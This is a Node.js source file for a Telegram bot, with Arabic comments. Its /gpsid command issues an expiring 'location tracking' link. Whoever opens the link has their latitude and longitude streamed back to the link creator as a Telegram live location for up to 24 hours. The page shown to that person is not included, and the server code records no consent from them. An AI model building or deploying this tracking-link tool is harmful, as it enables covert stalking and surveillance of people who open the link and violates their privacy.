const crypto = require('crypto');
const { encrypt, decrypt } = require('../../utils/crypto');
const config = require('../../core/config');
const fs = require('fs');
const path = require('path');

const sessions = new Map();

module.exports = (bot, app) => {
    // أمر توليد الرابط
    bot.command('gpsid', async (ctx) => {
        const chatId = ctx.chat.id;
        const uniqueId = crypto.randomBytes(8).toString('hex');
        const encryptedChatId = encrypt(chatId.toString());
        const expiresAt = Date.now() + config.SESSION_EXPIRY;

        sessions.set(uniqueId, { encryptedChatId, liveMessageId: null, expiresAt });

        const domain = config.DOMAIN || `http://localhost:${config.PORT}`;
        const customLink = `${domain}/gps-${uniqueId}`;
        
        await ctx.reply(
            `🔗 <b>[خدمة تتبع الموقع]</b>\n\n` +
            `تم إنشاء رابطك الفريد:\n` +
            `<code>${customLink}</code>\n\n` +
            `⚠️ صالح لمدة 24 ساعة.`, 
            { parse_mode: 'HTML' }
        );
    });

    // صفحة الويب
    app.get('/gps-:id', (req, res) => {
        const linkId = req.params.id;
        const session = sessions.get(linkId);
        
        if (!session || session.expiresAt < Date.now()) {
            if (session) sessions.delete(linkId);
            return res.status(404).send("عذراً، الرابط منتهي الصلاحية.");
        }

        const templatePath = path.join(__dirname, 'templates/page.html');
        let html = fs.readFileSync(templatePath, 'utf8');
        html = html.replace('${linkId}', linkId);
        res.send(html);
    });

    // استقبال الموقع
    app.post('/api/update-loc', async (req, res) => {
        const { id, lat, lon } = req.body;
        const session = sessions.get(id);
        if (!session || session.expiresAt < Date.now()) return res.json({ status: 'error' });

        try {
            const ownerChatId = decrypt(session.encryptedChatId);
            if (!session.liveMessageId) {
                const response = await bot.telegram.sendLocation(ownerChatId, lat, lon, { live_period: 86400 });
                session.liveMessageId = response.message_id;
            } else {
                await bot.telegram.editMessageLiveLocation(ownerChatId, session.liveMessageId, undefined, lat, lon);
            }
            res.json({ status: 'success' });
        } catch (err) {
            if (err.response && err.response.error_code === 400) session.liveMessageId = null;
            res.json({ status: 'error' });
        }
    });
};
